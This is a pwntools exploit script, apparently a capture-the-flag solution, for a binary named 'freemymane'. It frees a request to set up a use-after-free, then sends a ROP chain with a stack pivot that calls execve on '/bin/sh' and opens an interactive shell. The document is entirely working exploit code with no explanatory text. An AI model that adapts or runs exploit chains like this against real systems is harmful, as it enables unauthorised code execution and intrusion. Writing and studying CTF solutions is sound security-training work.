#!/usr/bin/python3
from pwn import *


elf = ELF("./freemymane", checksec=False)
context.arch = "amd64"


def menu(idx: int):
    p.sendlineafter(b">>", str(idx).encode())


def add_req(title, content):
    menu(1)
    p.sendlineafter(b":", title)
    p.sendlineafter(b":", content)


def edit_req(title, content):
    menu(2)
    p.sendlineafter(b":", title)
    p.sendlineafter(b":", content)


def show_req(idx):
    menu(3)
    p.sendlineafter(b"show: ", str(idx).encode())
    p.recvuntil(b":")
    title = p.recvline()[:-1]
    p.recvuntil(b":")
    content = p.recvline()[:-1]
    return [title, content]


def free_req(idx):
    menu(4)
    p.recvline()
    p.sendline(str(idx).encode())


def add_data(title, content):
    menu(5)
    p.sendlineafter(b":", title)
    p.sendlineafter(b":", content)


syscall = 0x0000000000401085
pop_rdi = 0x403E95
pop_rsi = 0x402DAC
pop_rax = 0x0000000000413C23
pop_rbx = 0x0000000000402CC9
xchg_rdx_rax = 0x0000000000402648

p = process(elf.path)
context.terminal = ["foot"]
gdb.attach(p)
# p = remote("freemyman.chal.wwctf.com", 1337)

add_req(b"test", b"miaou")
free_req(1)

payload = b"A" * 2  # junk
payload += p64(pop_rdi)
payload += p64(next(elf.search(b"/bin/sh\0")))
payload += b"A" * 32
payload += p64(pop_rbx)  # To avoid the 16 bytes of gibberish


payload = payload.ljust(62, b"A")

payload += p64(0x4834FC + 2)

xchg_rsp_r10 = 0x000000000045C0D8
payload += p64(xchg_rsp_r10)
payload += b"junk" # realign with sRIP
payload += p64(pop_rsi)
payload += p64(0) * 4

payload += p64(pop_rax)
payload += p64(0x468180)
payload += p64(xchg_rdx_rax)
payload += p64(pop_rax)
payload += p64(0xFFFFFFFFFFFFFFFF - 0x11)
payload += p64(0x40264A)
payload += p64(elf.sym["BASEUNIX_$$_FPEXECVE$PCHAR$PPCHAR$PPCHAR$$LONGINT"])


add_data(b"", payload)


menu(3)
pause()
p.sendlineafter(b"show: ", b"1")


p.interactive()
